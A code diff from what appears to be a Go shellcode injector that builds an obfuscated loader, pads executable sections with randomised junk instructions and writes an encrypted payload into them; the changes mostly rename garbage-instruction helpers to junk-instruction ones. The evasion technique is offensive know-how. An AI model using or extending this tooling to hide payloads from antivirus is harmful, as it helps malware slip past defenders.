@@ -150,10 +150,10 @@ func (inj *Injector) buildLoader(payload []byte) (output []byte, err error) {
 	case "amd64":
 		loader = inj.getLoaderX64()
 	}
-	// record seed for build loader and insert garbage instruction
+	// record seed for build loader and insert junk instruction
 	seed := inj.rand.Int63()
 	inj.rand.Seed(seed + 1024)
-	inj.igir.Seed(seed + 2048)
+	inj.ijir.Seed(seed + 2048)
 	// the first generation is used to calculate loader size
 	asm, err := inj.generateLoader(loader, payload, true)
 	if err != nil {
@@ -166,7 +166,7 @@ func (inj *Injector) buildLoader(payload []byte) (output []byte, err error) {
 	inj.loaderSize = uint32(len(bin)) // #nosec G115
 	// reset random seed and generate the finial loader
 	inj.rand.Seed(seed + 1024)
-	inj.igir.Seed(seed + 2048)
+	inj.ijir.Seed(seed + 2048)
 	asm, err = inj.generateLoader(loader, payload, true)
 	if err != nil {
 		return nil, err
@@ -282,7 +282,8 @@ func (inj *Injector) generateLoader(loader string, payload []byte, process bool)
 	tpl, err := template.New("loader").Funcs(template.FuncMap{
 		"db":  toDB,
 		"hex": toHex,
-		"igi": inj.insertGarbageInst,
+		"iji": inj.insertJunkInst,
+		"ijs": inj.insertJunkInstShort,
 	}).Parse(loader)
 	if err != nil {
 		return "", fmt.Errorf("invalid loader template: %s", err)
@@ -798,11 +799,11 @@ func (inj *Injector) useExtendTextMode(ctx *loaderCtx, loader string, payload []
 	for i := uint32(0); i < extended; i++ {
 		inj.dup[text.Offset+i] = 0xCC
 	}
-	inj.paddingGarbageInst(text.Offset, randomBeginSize+reservedInstSize)
+	inj.paddingJunkInst(text.Offset, randomBeginSize+reservedInstSize)
 	off := randomBeginSize + reservedInstSize + inj.loaderSize
-	inj.paddingGarbageInst(text.Offset+off, reservedInstSize+randomEndSize)
+	inj.paddingJunkInst(text.Offset+off, reservedInstSize+randomEndSize)
 	off += reservedInstSize + randomEndSize + payloadSize
-	inj.paddingGarbageInst(text.Offset+off, extended-size)
+	inj.paddingJunkInst(text.Offset+off, extended-size)
 	// write encrypted payload
 	copy(inj.dup[text.Offset+payloadOffset:], payload)
 	// update context
@@ -858,9 +859,9 @@ func (inj *Injector) useExtendTextNSMode(ctx *loaderCtx, loader string, payload 
 	for i := uint32(0); i < extended; i++ {
 		inj.dup[text.Offset+i] = 0xCC
 	}
-	inj.paddingGarbageInst(text.Offset, randomBeginSize+reservedInstSize)
+	inj.paddingJunkInst(text.Offset, randomBeginSize+reservedInstSize)
 	off := randomBeginSize + reservedInstSize + inj.loaderSize
-	inj.paddingGarbageInst(text.Offset+off, extended-off)
+	inj.paddingJunkInst(text.Offset+off, extended-off)
 	// write encrypted payload
 	copy(inj.dup[section.Offset:], payload)
 	// update context
@@ -903,11 +904,11 @@ func (inj *Injector) useCreateTextMode(ctx *loaderCtx, loader string, payload []
 	for i := uint32(0); i < section.Size; i++ {
 		inj.dup[section.Offset+i] = 0xCC
 	}
-	inj.paddingGarbageInst(section.Offset, randomBeginSize+reservedInstSize)
+	inj.paddingJunkInst(section.Offset, randomBeginSize+reservedInstSize)
 	off := randomBeginSize + reservedInstSize + inj.loaderSize
-	inj.paddingGarbageInst(section.Offset+off, reservedInstSize+randomEndSize)
+	inj.paddingJunkInst(section.Offset+off, reservedInstSize+randomEndSize)
 	off += reservedInstSize + randomEndSize + payloadSize
-	inj.paddingGarbageInst(section.Offset+off, section.Size-size)
+	inj.paddingJunkInst(section.Offset+off, section.Size-size)
 	// write encrypted payload
 	copy(inj.dup[section.Offset+payloadOffset:], payload)
 	// update context
